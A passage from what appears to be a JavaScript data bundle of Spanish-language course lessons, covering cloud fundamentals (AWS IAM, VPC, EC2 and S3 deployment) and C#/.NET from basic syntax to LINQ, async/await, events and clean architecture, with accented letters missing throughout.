*   **Servicios Clave:** EC2 (VMs), S3 (Storage), RDS (Bases de datos).

## 2. Microsoft Azure
*   **La Corporacin:** Fuerte en empresas que ya usan Windows/Office.
*   **Ventaja:** Mejor integracin con Active Directory, Windows Server y entornos corporativos.
*   **Servicios Clave:** Azure Virtual Machines, Blob Storage, Azure SQL Database.

## 3. Google Cloud Platform (GCP)
*   **El Innovador:** Naci de la infraestructura interna de Google.
*   **Fuerte en:** Big Data, Machine Learning y Contenedores (Kubernetes naci aqu).
*   **Servicios Clave:** Compute Engine, Cloud Storage, BigQuery.

## Comparativa Rpida
| Concepto | AWS | Azure | GCP |
| :--- | :--- | :--- | :--- |
| Mquina Virtual | EC2 | Virtual Machine | Compute Engine |
| Storage Objetos | S3 | Blob Storage | Cloud Storage |
| Kubernetes | EKS | AKS | GKE |
| Serverless | Lambda | Azure Functions | Cloud Functions |

---

### Misin Junior:
Crea una cuenta gratuita ("Free Tier") en AWS o Google Cloud. Te pedirn tarjeta de crdito (es normal, no cobran si te mantienes en los lmites gratis).
AWS ofrece 750 horas de EC2 micro gratis al mes por un ao.
`,completed:!1},{id:"cloud-03-fundamentos-aws",title:"Fundamentos AWS (EC2, S3, IAM)",level:"junior",content:`# Leccin 3: Fundamentos AWS (EC2, S3, IAM)

Aprender AWS es aprender el vocabulario de la nube.

## 1. Regiones y Zonas de Disponibilidad (Availability Zones - AZ)
*   **Regin:** rea geogrfica fsica (ej: \`us-east-1\` N. Virginia, \`sa-east-1\` So Paulo).
*   **AZ:** Un datacenter (o varios) dentro de una regin. \`us-east-1a\`, \`us-east-1b\`. Estn aislados entre s (distinta electricidad, inundaciones) pero conectados por fibra ultrarpida.
*   *Concepto Clave:* Si quieres que tu app no se caiga nunca, despliega en mltiples AZ.

## 2. EC2 (Elastic Compute Cloud) - IaaS
Son tus servidores virtuales.
*   **Instance Type:** Tamao de la VM. \`t2.micro\` (1 CPU, 1GB RAM) es la gratis. \`c5.4xlarge\` (16 CPU, 32GB RAM) es para procesar duro.
*   **AMI (Amazon Machine Image):** El sistema operativo base (Ubuntu, Linux 2, Windows).

## 3. S3 (Simple Storage Service) - Storage
Almacenamiento de objetos. Infinito.
*   **Buckets:** Contenedores de archivos (como carpetas raz). Los nombres son globales (nicos en todo el mundo).
*   **Objetos:** Archivos.
*   **Durabilidad:** 99.999999999% (11 nueves). Es casi imposible perder un dato aqu.

## 4. IAM (Identity and Access Management) - Seguridad
El portero de la discoteca.
*   **Usuarios:** Personas (T).
*   **Roles:** Sombreros que se ponen los servicios (ej: Una EC2 tiene permiso de leer S3).
*   **Policies:** Documentos JSON que dicen qu se puede hacer.
    *   *Regla de Oro:* NUNCA uses la cuenta "Root" (email principal) para trabajar da a da. Crea un usuario IAM con permisos de Admin.

---

### Misin Junior:
1. Entra a la consola de AWS.
2. Ve a IAM y crea un usuario llamado \`admin-junior\`.
3. Dale acceso a la consola y asocia la poltica \`AdministratorAccess\`.
4. Loguate con ese usuario nuevo. Nunca ms uses root.
`,completed:!1},{id:"cloud-04-networking",title:"Networking Bsico",level:"junior",content:`# Leccin 4: Networking Bsico (VPC y Security Groups)

Tus servidores necesitan hablar, pero no con cualquiera.

## 1. VPC (Virtual Private Cloud)
Es tu pedazo privado de la nube. Una red virtual aislada donde pones tus recursos.
AWS te da una "Default VPC" lista para usar (sa esa por ahora).

## 2. Subnets (Subredes)
Divisiones dentro de tu VPC.
*   **Subnet Pblica:** Tiene ruta a Internet (Internet Gateway). Aqu pones tu Servidor Web.
*   **Subnet Privada:** NO tiene acceso directo desde internet. Aqu pones tu Base de Datos (por seguridad).

## 3. Direcciones IP
*   **IP Privada:** \`172.31.x.x\`. Solo sirve para hablar dentro de AWS. Fija mientras la instancia viva.
*   **IP Pblica:** \`54.23.x.x\`. Accesible desde tu casa. Cambia si apagas y prendes la instancia (a menos que uses una Elastic IP).

## 4. Security Groups (El Firewall)
Son firewalls virtuales a nivel de instancia. Por defecto **Niegan todo**. Tienes que abrir puertos explcitamente.
*   **Inbound (Entrada):**
    *   Puerto 22 (SSH): Para administrar Linux. brelo solo a TU IP (\`My IP\`).
    *   Puerto 80 (HTTP): Para que el mundo vea tu web. brelo a \`0.0.0.0/0\` (Todo internet).
*   **Outbound (Salida):** Normalmente todo abierto (\`Allow All\`).

---

### Misin Junior:
Cuando lances tu EC2:
1. Crea un Security Group nuevo llamado \`web-sg\`.
2. Agrega regla: Allow SSH (22) from My IP.
3. Agrega regla: Allow HTTP (80) from Anywhere (0.0.0.0/0).
Si no haces esto, tu servidor ser inaccesible.
`,completed:!1},{id:"cloud-05-deploy-basico",title:"Deploy Bsico",level:"junior",content:`# Leccin 5: Deploy Bsico (Tu Hola Mundo en la Nube)

Vamos a poner algo real en internet.

## Paso 1: Lanzar Instancia (EC2)
1.  Consola AWS -> EC2 -> Launch Instance.
2.  Nombre: \`MiPrimerServidor\`.
3.  OS: Ubuntu 22.04 LTS.
4.  Instance Type: \`t2.micro\` (Free tier).
5.  Key Pair: Crea una nueva (\`mi-llave.pem\`). **DESCRGALA Y GURDALA BIEN.** Es la nica forma de entrar.
6.  Network settings: Selecciona "Allow SSH" y "Allow HTTP traffic from the internet".

## Paso 2: Conectarse
Usa tu terminal (o Putty en Windows).
\`\`\`bash
# Permisos a la llave (solo lectura para m) - Vital en Linux/Mac
chmod 400 mi-llave.pem

# Conectar
ssh -i mi-llave.pem ubuntu@<IP-PUBLICA-DE-EC2>
\`\`\`
Si ves \`ubuntu@ip-172-x-x-x:~$\`, ests dentro de la nube.

## Paso 3: Instalar Servidor Web
\`\`\`bash
sudo apt update
sudo apt install nginx -y
\`\`\`
Ve a tu navegador y pon la IP Pblica. Deberas ver "Welcome to nginx!".

## Paso 4: Subir Archivos a S3
Para archivos estticos (imgenes, PDFs), no uses el disco del servidor, usa S3.
1. Consola AWS -> S3 -> Create Bucket.
2. Nombre nico: \`mi-proyecto-assets-123\`.
3. Desactiva "Block all public access" (si quieres que sean visibles). Ojo, te pedir confirmar que eres consciente del riesgo.
4. Sube una imagen \`logo.png\`.
5. Entra al objeto y copia su "Object URL".

---

### Misin Junior:
1. Edita el archivo \`index.html\` en tu EC2: \`sudo nano /var/www/html/index.html\`.
2. Escribe un HTML simple que diga "Hola Mundo desde AWS".
3. Inserta la imagen que subiste a S3 usando la etiqueta \`<img>\`.
4. Guarda y visita tu IP pblica. Tienes una web hbrida (Compute + Storage)!
`,completed:!1},{id:"cloud-06-proyecto-final-junior",title:"Proyecto Final Junior Cloud",level:"junior",content:`# Proyecto Final Nivel Junior: "Infraestructura Base"

Vas a provisionar tu primer entorno de desarrollo en la nube de forma manual para entender las piezas.

## Objetivo
Tener un servidor web accesible pblicamente y un almacenamiento de objetos configurado.

## Requisitos
1.  **Cuenta AWS:** Free tier activa.
2.  **IAM:** Usuario administrador creado (no root).
3.  **EC2:**
    *   Instancia \`t2.micro\` corriendo Linux.
    *   Security Group configurado correctamente (SSH solo t, HTTP mundo).
    *   Servidor Nginx o Apache instalado y corriendo.
4.  **S3:**
    *   Un bucket creado.
    *   Un archivo \`index.html\` subido al bucket (esta vez serviremos el HTML desde S3 como web esttica, no desde EC2).
    *   Habilitar "Static website hosting" en las propiedades del bucket S3.

## Entregable (Checklist Personal)
*   [ ] Puedo conectarme por SSH a mi servidor sin errores de timeout.
*   [ ] Mi servidor responde en el puerto 80 (HTTP).
*   [ ] Mi bucket S3 tiene una URL pblica de endpoint web (\`...s3-website...\`).
*   [ ] He borrado (Terminated) la instancia EC2 al terminar para no gastar mis horas gratis innecesariamente.

Felicidades! Has dado el primer paso fuera de tu mquina local.
`,completed:!1}]},d1={id:"csharp",title:"C# / .NET",description:"Domina el ecosistema empresarial ms robusto del mundo. Desde aplicaciones de consola hasta la nube con ASP.NET Core.",completed:!1,track:"Especializacin Backend Enterprise",lessons:[{id:"csharp-01-intro-csharp",title:"Introduccin a C# y .NET",level:"junior",content:`# Leccin 1: Introduccin a C# y .NET

C# (C-sharp) es un lenguaje moderno, multiparadigma y fuertemente tipado desarrollado por Microsoft. Funciona sobre la plataforma **.NET**, un ecosistema gigante para crear cualquier tipo de aplicacin (Web, Escritorio, Mvil, Cloud, IoT, IA).

## 1. Qu es .NET?
Es el "Runtime" donde corre C#. Similar a la JVM de Java.
*   **.NET (Core):** La versin moderna, open-source y multiplataforma (Windows, Linux, Mac).
*   **.NET Framework:** La versin antigua (solo Windows). Evtala si puedes!

## 2. Hello World
\`\`\`csharp
// Program.cs (Top-level statements en .NET 6+)
Console.WriteLine("Hola Mundo desde C#");
\`\`\`
Antes de .NET 6, haba mucho "boilerplate" (\`class Program\`, \`void Main\`, etc.), pero ahora es directo.

## 3. Compilacin
C# se compila a **IL (Intermediate Language)**, que luego el **CLR (Common Language Runtime)** ejecuta en tu mquina usando JIT (Just-In-Time compilation) para mximo rendimiento.

---

### Misin Junior:
Instala el **SDK de .NET 8** y crea tu primer proyecto en la terminal con \`dotnet new console -o MiApp\`. Ejectalo con \`dotnet run\`.
`,completed:!1},{id:"csharp-02-sintaxis-tipos",title:"Sintaxis Bsica y Tipos de Datos C#",level:"junior",content:'# Leccin 2: Sintaxis Bsica y Tipos de Datos C#\n\nC# es estrictamente tipado y sensible a maysculas (case-sensitive). Usa `{}` para bloques y `;` al final de cada statement.\n\n## 1. Tipos de Datos Primitivos\n*   **Enteros:** `int`, `long`, `byte`, `short`.\n*   **Flotantes:** `double` (rpido), `float`, `decimal` (precisin financiera, 128 bits).\n*   **Texto:** `string` (UTF-16), `char`.\n*   **Boolean:** `bool` (true/false).\n*   **Dinmico:** `dynamic` y `var`.\n    *   `var x = 10;` (El compilador infiere que x es int. Sigue siendo tipado estticamente).\n    *   `dynamic y = 10;` (Chequeo en tiempo de ejecucin. Evtalo al principio).\n\n## 2. String Interpolation\nLa forma moderna de combinar texto.\n```csharp\nstring nombre = "Ana";\nint edad = 30;\nstring mensaje = $"Hola, {nombre}, tienes {edad} aos.";\n```\n\n## 3. Arrays\n```csharp\nint[] numeros = { 1, 2, 3, 4, 5 };\nstring[] dias = new string[7];\n```\n\n---\n\n### Misin Junior:\nUsa `decimal` siempre que manejes dinero. `double` tiene problemas de redondeo binario (0.1 + 0.2 != 0.3).\n',completed:!1},{id:"csharp-03-control-flujo",title:"Control de Flujo (If, Switch, Loops)",level:"junior",content:`# Leccin 3: Control de Flujo (If, Switch, Loops)

C# tiene todas las estructuras de control clsicas, ms algunas modernas.

## 1. Condicionales (If/Else)
\`\`\`csharp
if (edad >= 18) {
    Console.WriteLine("Mayor de edad");
} else {
    Console.WriteLine("Menor de edad");
}
\`\`\`

## 2. Switch Expressions (Moderno)
Sintaxis limpia y funcional introducida en C# 8.
\`\`\`csharp
string resultado = dia switch {
    1 => "Lunes",
    2 => "Martes",
    _ => "Otro da" // Default
};
\`\`\`

## 3. Bucles (Loops)
*   **While:** \`while (cond) { ... }\`
*   **Do-While:** \`do { ... } while (cond);\`
*   **For:** \`for (int i=0; i<10; i++) { ... }\`
*   **Foreach:** Itera sobre colecciones. El ms usado.
    \`\`\`csharp
    foreach (var item in lista) {
        Console.WriteLine(item);
    }
    \`\`\`

---

### Misin Junior:
Acostmbrate a usar \`foreach\` en lugar de \`for\` cuando no necesites el ndice. Es ms seguro y legible.
`,completed:!1},{id:"csharp-04-metodos",title:"Mtodos y Funciones en C#",level:"junior",content:`# Leccin 4: Mtodos y Funciones en C#

Un mtodo es una subrutina. Siempre pertenecen a una clase (en POO) o archivo (Top-Level).

## 1. Declaracin
\`\`\`csharp
public int Sumar(int a, int b) {
    return a + b;
}
\`\`\`
*   \`public\` (Modificador de acceso).
*   \`int\` (Tipo de retorno).
*   \`(int a, int b)\` (Parmetros).

## 2. Argumentos Nombrados
Puedes poner los argumentos en cualquier orden si los nombras. Ideal si hay muchos argumentos opcionales.
\`\`\`csharp
static void CrearUsuario(string nombre, int edad = 18, bool isAdmin = false) { ... }
// Llamada:
CrearUsuario(edad: 25, nombre: "Juan");
\`\`\`

## 3. Funciones Flecha (Expression-Bodied Members)
Para funciones de una sola lnea, la sintaxis es muy concisa.
\`\`\`csharp
public int Doble(int x) => x * 2;
\`\`\`

## 4. Params
Para recibir un nmero variable de argumentos (VarArgs).
\`\`\`csharp
void Imprimir(params int[] numeros) { ... }
Imprimir(1, 2, 3);
Imprimir(1);
\`\`\`

---

### Misin Junior:
Usa \`PascalCase\` para nombres de mtodos (\`CalcularTotal\`) y \`camelCase\` para variables locales y parmetros (\`totalImpuestos\`). Es la convencin estndar en .NET.
`,completed:!1},{id:"csharp-05-clases-basicas",title:"Clases y Objetos Bsicos en C#",level:"junior",content:`# Leccin 5: Clases y Objetos Bsicos en C#

C# es POO puro. Todo (o casi) es un objeto.

## 1. Declaracin Clsica
\`\`\`csharp
public class Persona
{
    public string Nombre; // Campo pblico (Evtalo)
    private int edad;     // Campo privado

    public Persona(string nombre, int edad) { // Constructor
        Console.WriteLine("Creando persona...");
        Nombre = nombre;
        this.edad = edad;
    }
}
\`\`\`

## 2. Propiedades e Inicializadores
Usa Properties (\`get; set;\`) en lugar de getters/setters manuales como Java.
\`\`\`csharp
public class Producto {
    public string Nombre { get; set; } = ""; // Valor por defecto
    public decimal Precio { get; set; }
}

// Inicializador de Objetos (Object Initializer)
var p = new Producto {
    Nombre = "Libro",
    Precio = 20.5m
};
\`\`\`

## 3. Clases Estticas
Como \`Math\` o \`Console\`. No se pueden instanciar.

---

### Misin Junior:
Nunca expongas \`fields\` pblicos directamente. Usa propiedades (\`public int Edad { get; set; }\`). Permite validacin futura sin romper clientes.
`,completed:!1},{id:"csharp-06-practica-junior",title:"Primeros Pasos con C#",level:"junior",content:`# Prctica: Primeros Pasos con C#

Manos al teclado! El objetivo de esta prctica es familiarizarte con la sintaxis, el entorno .NET y la creacin de clases sencillas.

---

## Ejercicio 1: Calculadora de IMC (Consola)
Crea una aplicacin de consola que:
1.  Pida al usuario su peso (kg) y altura (m).
2.  Calcule el IMC (ndice de Masa Corporal = peso / altura).
3.  Imprima el resultado con 2 decimales y una clasificacin:
    *   < 18.5: Bajo peso
    *   18.5 - 24.9: Normal
    *   25 - 29.9: Sobrepeso
    *   >= 30: Obesidad

## Ejercicio 2: Lista de Tareas (Array)
Crea un programa que permita almacenar 5 tareas en un array fijo (\`string[]\`).
*   Debe permitir al usuario ingresar las 5 tareas una por una.
*   Luego, debe imprimirlas en formato lista: \`1. Comprar pan\`.

## Ejercicio 3: Clase \`CuentaBancaria\`
*   Define una clase \`Cuenta\` con propiedades: \`Titular\` (string), \`Saldo\` (decimal, privado).
*   Mtodos pblicos: \`Depositar(monto)\` y \`Retirar(monto)\`.
    *   Validar que no se puede retirar ms de lo que hay.
*   Sobreescribe el mtodo \`ToString()\` para mostrar: "Cuenta de Juan: $1000".

---

### Solucin Sugerida (Parte 1):
\`\`\`csharp
Console.Write("Peso (kg): ");
double peso = double.Parse(Console.ReadLine());

Console.Write("Altura (m): ");
double altura = double.Parse(Console.ReadLine());

double imc = peso / (altura * altura);
Console.WriteLine($"Tu IMC es: {imc:F2}");
\`\`\`
`,completed:!1,isProject:!0},{id:"csharp-07-encapsulamiento",title:"Encapsulamiento y Propiedades Avanzadas",level:"junior",content:`# Leccin 7: Encapsulamiento y Propiedades Avanzadas

El encapsulamiento protege el estado interno de un objeto. En C#, las **Properties** son la herramienta principal.

## 1. Modificadores de Acceso
*   \`public\`: Sin restricciones.
*   \`private\`: Solo dentro de la misma clase.
*   \`protected\`: Dentro de la clase y sus hijas.
*   \`internal\`: Solo dentro del mismo proyecto (Ensamblado).

## 2. Auto-Properties vs Full Properties
\`\`\`csharp
public class Usuario {
    // Auto-property (Concisa)
    public string Nombre { get; set; }

    // Full property (Con lgica de validacin)
    private int _edad;
    public int Edad {
        get { return _edad; }
        set {
            if (value < 0) throw new ArgumentException("La edad no puede ser negativa");
            _edad = value;
        }
    }
}
\`\`\`

## 3. Init-Only Properties (C# 9)
Permiten que el valor se asigne solo durante la creacin del objeto.
\`\`\`csharp
public int Id { get; init; }
\`\`\`

---

### Misin Junior:
Usa \`private set;\` si quieres que el mundo lea la propiedad pero solo la clase pueda modificarla: \`public decimal Saldo { get; private set; }\`.
`,completed:!1},{id:"csharp-08-herencia-polimorfismo",title:"Herencia y Polimorfismo",level:"junior",content:`# Leccin 8: Herencia y Polimorfismo

C# permite heredar de una sola clase (Herencia simple) pero implementar mltiples interfaces.

## 1. Herencia (\`:\`)
Usamos el smbolo \`:\` para indicar que una clase hereda de otra.
\`\`\`csharp
public class Animal {
    public string Nombre { get; set; }
    public void Comer() => Console.WriteLine("Comiendo...");
}

public class Perro : Animal {
    public void Ladrar() => Console.WriteLine("Guau!");
}
\`\`\`

## 2. Polimorfismo (\`virtual\` y \`override\`)
Para que un mtodo sea sobrescrito, el padre debe marcarlo como \`virtual\` y el hijo como \`override\`.
\`\`\`csharp
public class Empleado {
    public virtual void Trabajar() => Console.WriteLine("Haciendo cosas de oficina...");
}

public class Desarrollador : Empleado {
    public override void Trabajar() => Console.WriteLine("Escribiendo cdigo en C#...");
}
\`\`\`

## 3. Acceso al Padre (\`base\`)
Usa \`base\` para llamar a constructores o mtodos de la clase base.
\`\`\`csharp
public Perro(string nombre) : base(nombre) { ... }
\`\`\`

---

### Misin Junior:
El polimorfismo te permite tratar a un \`Desarrollador\` como un \`Empleado\` genrico, pero que siga ejecutando su propia lgica de trabajo. Es la clave para crear sistemas escalables.
`,completed:!1},{id:"csharp-09-interfaces",title:"Interfaces y Clases Abstractas",level:"junior",content:`# Leccin 9: Interfaces y Clases Abstractas

Qu puede hacer un objeto? Las interfaces definen el "Qu", no el "Cmo".

## 1. Interfaces (\`interface\`)
Por convencin, empiezan con la letra \`I\`. No tienen campos (fields) y todos sus miembros son pblicos por defecto.
\`\`\`csharp
public interface IVolador {
    void Volar();
}

public class Avion : IVolador {
    public void Volar() => Console.WriteLine("El avin despega con motores.");
}
\`\`\`

## 2. Clases Abstractas (\`abstract\`)
Son clases a medio camino. Pueden tener lgica implementada y mtodos que obligatoriamente deben definir los hijos.
\`\`\`csharp
public abstract class Figura {
    public abstract double CalcularArea(); // Sin implementacin
    public void Imprimir() => Console.WriteLine("Soy una figura");
}
\`\`\`

## 3. Cundo usar cul?
*   **Interfaces:** Cuando quieres definir una capacidad comn entre clases que no tienen nada que ver entre s (Ej: \`IClonable\`).
*   **Abstractas:** Cuando hay un parentesco real y quieres compartir cdigo base.

---

### Misin Junior:
En el mundo profesional de .NET, programamos contra **Interfaces**, no contra implementaciones concretas. Esto facilita mucho las pruebas unitarias (Unit Testing).
`,completed:!1},{id:"csharp-10-practica-junior-poo",title:"Lgica y POO Junior en C#",level:"junior",content:`# Prctica: Lgica y POO Junior en C#

Pondremos a prueba tu capacidad para estructurar objetos y validar datos.

---

## 1. Sistema de Gestin de Empleados
**Consigna:** Crea una jerarqua de clases para una empresa.
*   Clase Base: \`Empleado\` (Nombre, ID, SueldoBase).
*   Clase Hija: \`Gerente\`. El sueldo total es \`SueldoBase + Bono\`.
*   Clase Hija: \`Vendedor\`. El sueldo total es \`SueldoBase + (Comision * Ventas)\`.
*   Aade un mtodo \`ObtenerReporte()\` que imprima los datos del empleado y su sueldo final.

## 2. Validacin de Productos
**Consigna:** Crea una clase \`Producto\` con:
*   \`Nombre\`: No puede ser nulo ni vaco.
*   \`Precio\`: Debe ser mayor a 0.
*   \`PrecioConIVA\`: Propiedad de solo lectura que devuelva el precio + 21%.
*   Si se intenta asignar un valor invlido, lanza una \`ArgumentException\`.

## 3. Reto de Lgica: El Validador de Password
**Consigna:** Crea un mtodo esttico \`ValidarPassword(string pass)\` que devuelva un \`bool\`.
Debe cumplir:
1.  Mnimo 8 caracteres.
2.  Al menos una letra mayscula.
3.  Al menos un nmero.
*Pista: Usa \`Char.IsUpper(c)\` y \`Char.IsDigit(c)\` dentro de un bucle.*

---

### Ejemplo de Estructura:
\`\`\`csharp
public class Producto {
    private string _nombre;
    public string Nombre {
        get => _nombre;
        set => _nombre = !string.IsNullOrWhiteSpace(value) ? value : throw new ArgumentException("Nombre invlido");
    }
}
\`\`\`
`,completed:!1,isProject:!0},{id:"csharp-11-colecciones-genericos",title:"Colecciones y Genricos",level:"semi-senior",content:`# Leccin 11: Colecciones y Genricos

Olvdate de los arrays de tamao fijo. Las colecciones de \`System.Collections.Generic\` son tu da a da.

## 1. \`List<T>\` (La ms usada)
Arreglo dinmico. Crece automticamente.
\`\`\`csharp
var nombres = new List<string> { "Ana", "Luis" };
nombres.Add("Pedro");
nombres.Remove("Ana");
nombres.ForEach(n => Console.WriteLine(n));
\`\`\`

## 2. \`Dictionary<TKey, TValue>\` (Mapas)
Asocia claves con valores. Acceso O(1).
\`\`\`csharp
var edades = new Dictionary<string, int> {
    { "Ana", 30 },
    { "Luis", 25 }
};
edades["Pedro"] = 28; // Agregar
if (edades.TryGetValue("Ana", out int edad))
    Console.WriteLine($"Ana tiene {edad}");
\`\`\`

## 3. \`HashSet<T>\` (nicos)
Coleccin sin duplicados. Ideal para verificar membresa rpida.

## 4. Crear tus propios Genricos
\`\`\`csharp
public class Resultado<T> {
    public bool Exito { get; set; }
    public T Datos { get; set; }
    public string Error { get; set; }
}
\`\`\`

---

### Misin Semi-Senior:
Usa \`IReadOnlyList<T>\` y \`IReadOnlyDictionary<TKey, TValue>\` cuando expongas colecciones fuera de tu clase. Previene modificaciones accidentales.
`,completed:!1},{id:"csharp-12-linq",title:"LINQ (Language Integrated Query)",level:"semi-senior",content:`# Leccin 12: LINQ (Language Integrated Query)

LINQ es la feature ms poderosa de C#. Permite hacer consultas sobre cualquier coleccin usando una sintaxis funcional y elegante.

## 1. Sintaxis de Mtodo (La ms usada)
\`\`\`csharp
var empleados = new List<Empleado> { ... };

var seniors = empleados
    .Where(e => e.Experiencia > 5)
    .OrderByDescending(e => e.Sueldo)
    .Select(e => new { e.Nombre, e.Sueldo })
    .ToList();
\`\`\`

## 2. Operadores Clave
*   **Where:** Filtra. Equivale a \`filter()\` en JS.
*   **Select:** Transforma. Equivale a \`map()\` en JS.
*   **OrderBy / OrderByDescending:** Ordena.
*   **FirstOrDefault:** Primer elemento o \`null\` si no existe.
*   **Any / All:** Alguno/todos cumple la condicin?
*   **GroupBy:** Agrupa elementos.
*   **Sum / Average / Count / Max / Min:** Agregaciones.

## 3. Sintaxis de Query (Estilo SQL)
\`\`\`csharp
var resultado = from e in empleados
                where e.Experiencia > 5
                orderby e.Sueldo descending
                select e;
\`\`\`
La sintaxis de mtodo es preferida en la industria (ms flexible).

---

### Misin Semi-Senior:
LINQ es "lazy" (evaluacin diferida). No se ejecuta hasta que iteras el resultado (\`foreach\`, \`.ToList()\`, \`.Count()\`). Esto permite encadenar operaciones sin crear colecciones intermedias.
`,completed:!1},{id:"csharp-13-async-await",title:"Async/Await (Programacin Asncrona)",level:"semi-senior",content:'# Leccin 13: Async/Await (Programacin Asncrona)\n\nC# fue uno de los primeros lenguajes en tener `async/await` nativo (2012). El modelo es maduro y robusto.\n\n## 1. Por qu Async?\nCuando haces una llamada a una Base de Datos o una API, el hilo queda bloqueado esperando. Con `async`, ese hilo se libera para atender otras solicitudes.\n\n## 2. El Patrn TAP (Task-based Asynchronous Pattern)\n```csharp\npublic async Task<string> ObtenerDatosAsync() {\n    var response = await httpClient.GetAsync("https://api.ejemplo.com/datos");\n    return await response.Content.ReadAsStringAsync();\n}\n```\n*   `async` marca el mtodo como asncrono.\n*   `Task<T>` es la promesa (`Promise` en JS).\n*   `await` espera sin bloquear el hilo.\n\n## 3. Reglas de Oro\n1.  **Async all the way:** Si un mtodo llama a algo async, l tambin debera ser async.\n2.  **Nunca uses `.Result` o `.Wait()`**: Bloquea el hilo y puede causar deadlocks.\n3.  **Sufijo `Async`:** Convencin de nombrar los mtodos asncronos (`GetUserAsync`).\n4.  **`Task.WhenAll`:** Para operaciones en paralelo.\n\n```csharp\nvar tarea1 = ObtenerUsuariosAsync();\nvar tarea2 = ObtenerProductosAsync();\nawait Task.WhenAll(tarea1, tarea2);\n```\n\n---\n\n### Misin Semi-Senior:\nEn ASP.NET Core, los endpoints deben ser `async` siempre que accedan a I/O (red, disco, DB). Si no, ests desperdiciando hilos del ThreadPool y reduciendo la capacidad del servidor.\n',completed:!1},{id:"csharp-14-excepciones",title:"Excepciones y Manejo de Errores",level:"semi-senior",content:`# Leccin 14: Excepciones y Manejo de Errores

Un programa que no maneja errores es una bomba de tiempo.

## 1. Try-Catch-Finally
\`\`\`csharp
try {
    var resultado = int.Parse(input);
} catch (FormatException ex) {
    Console.WriteLine($"Error de formato: {ex.Message}");
} catch (Exception ex) { // Catch genrico siempre al final
    Console.WriteLine($"Error inesperado: {ex.Message}");
} finally {
    // Se ejecuta SIEMPRE (con o sin error)
    Console.WriteLine("Limpieza completada.");
}
\`\`\`

## 2. Excepciones Personalizadas
Crea tus propias excepciones para errores de dominio.
\`\`\`csharp
public class SaldoInsuficienteException : Exception {
    public decimal SaldoActual { get; }
    public SaldoInsuficienteException(decimal saldo)
        : base($"Saldo insuficiente: {saldo}") {
        SaldoActual = saldo;
    }
}
\`\`\`

## 3. El Patrn Result (Alternativa)
En lugar de lanzar excepciones para flujo de control, devuelve un objeto \`Result\`.
\`\`\`csharp
public record Result<T>(bool Success, T? Data, string? Error);
\`\`\`

---

### Misin Semi-Senior:
Las excepciones son para situaciones **excepcionales** (error de red, archivo corrupto). No las uses para control de flujo (Ej: verificar si un usuario existe). Para eso, devuelve \`null\` o un \`Result\`.
`,completed:!1},{id:"csharp-15-delegates-events",title:"Delegates y Events",level:"semi-senior",content:`# Leccin 15: Delegates y Events

Los Delegates son como los "punteros a funciones" de C. Los Events son la base de la programacin reactiva en .NET.

## 1. Delegates
Un Delegate es un tipo que representa una referencia a un mtodo con una firma especfica.
\`\`\`csharp
public delegate double Operacion(double a, double b);

Operacion sumar = (a, b) => a + b;
Operacion multiplicar = (a, b) => a * b;

Console.WriteLine(sumar(3, 4));       // 7
Console.WriteLine(multiplicar(3, 4)); // 12
\`\`\`

## 2. Delegates Predefinidos
No necesitas crear tus propios delegates. .NET tiene:
*   \`Action<T>\`: No retorna nada (\`void\`). Ej: \`Action<string> log = msg => Console.WriteLine(msg);\`
*   \`Func<T, TResult>\`: Retorna un valor. Ej: \`Func<int, int, int> sumar = (a, b) => a + b;\`
*   \`Predicate<T>\`: Retorna \`bool\`. Ej: \`Predicate<int> esPar = n => n % 2 == 0;\`

LINQ usa \`Func<>\` internamente para \`.Where()\`, \`.Select()\`, etc.

## 3. Events (Eventos)
Patrn Observer nativo de C#. Una clase "publica" un evento y otras se "suscriben".
\`\`\`csharp
public class Sensor {
    public event EventHandler<double> TemperaturaAlta;

    public void Leer(double temp) {
        if (temp > 40)
            TemperaturaAlta?.Invoke(this, temp); // Notificar suscriptores
    }
}

// Suscripcin
var sensor = new Sensor();
sensor.TemperaturaAlta += (sender, temp) => Console.WriteLine($"ALERTA: {temp}C!");
\`\`\`

---

### Misin Semi-Senior:
Los Events son la columna vertebral de las interfaces grficas (WPF, WinForms) y de muchos patrones de backend (CQRS, MediatR).
`,completed:!1},{id:"csharp-16-practica-semi-senior",title:"Desafo Semi-Senior C#",level:"semi-senior",content:'# Prctica: Desafo Semi-Senior C#\n\nIntegremos LINQ, Delegates, Async y Excepciones en ejercicios reales.\n\n---\n\n## 1. Procesador de Datos con LINQ\n**Consigna:** Tienes una `List<Producto>` con campos: `Nombre`, `Precio`, `Categoria`, `Stock`.\nUsando LINQ resuelve:\n1.  Productos con stock menor a 5, ordenados por precio ascendente.\n2.  Promedio de precios por categora (`GroupBy`).\n3.  Top 3 productos ms caros.\n4.  Hay algn producto con precio mayor a $10.000? (`Any`).\n\n## 2. Sistema de Notificaciones con Events\n**Consigna:**\n*   Crea una clase `Pedido` con un evento `PedidoConfirmado`.\n*   Crea una clase `NotificadorEmail` que se suscriba al evento e imprima "Email enviado a {cliente}".\n*   Crea una clase `NotificadorSMS` que se suscriba al mismo evento e imprima "SMS enviado a {telefono}".\n*   Al confirmar un pedido, ambos notificadores deben reaccionar.\n\n## 3. Cliente HTTP Async con Manejo de Errores\n**Consigna:**\n*   Crea un mtodo `async Task<string> FetchDataAsync(string url)` que simule una llamada HTTP.\n*   Usa `Task.Delay(1000)` para simular latencia.\n*   Si la URL contiene "error", lanza una `HttpRequestException`.\n*   Llama a 3 URLs en paralelo con `Task.WhenAll` y maneja los errores individualmente con `try-catch`.\n\n---\n\n### Resultado esperado:\nCdigo que demuestre fluidez con LINQ encadenado, uso correcto de events para desacoplamiento, y manejo de tareas asncronas sin bloquear hilos.\n',completed:!1,isProject:!0},{id:"csharp-17-clean-architecture-ddd",title:"Arquitectura Limpia y DDD en .NET",level:"senior",content:`# Leccin 17: Arquitectura Limpia y DDD en .NET

Escribir cdigo que funcione es fcil. Escribir cdigo que sobreviva 5 aos es el reto.

## 1. Clean Architecture (The Onion)
El objetivo es separar responsabilidades.
*   **Domain (Core):** Entidades y Lgica de Negocio pura. No depende de NADA (ni de EF Core, ni de ASP.NET).
*   **Application:** Casos de Uso (Use Cases), DTOs, Interfaces de Repositorios. Depende de Domain.
*   **Infrastructure:** Implementacin de Repositorios (EF Core), Servicios de Email, APIs externas. Depende de Application.
*   **API (Presentation):** Controllers. Depende de Application e Infrastructure (solo para inyeccin).

## 2. Domain-Driven Design (DDD) - Conceptos Clave
*   **Entity:** Objeto con identidad (ID). Ej: \`Usuario\`.
*   **Value Object:** Objeto definido por sus valores, inmutable. Ej: \`Direccion\`, \`Dinero\`.
*   **Aggregate Root:** La entidad principal que controla el acceso a otras entidades. Ej: \`Pedido\` controla sus \`Items\`. Solo el \`Pedido\` tiene Repositorio.

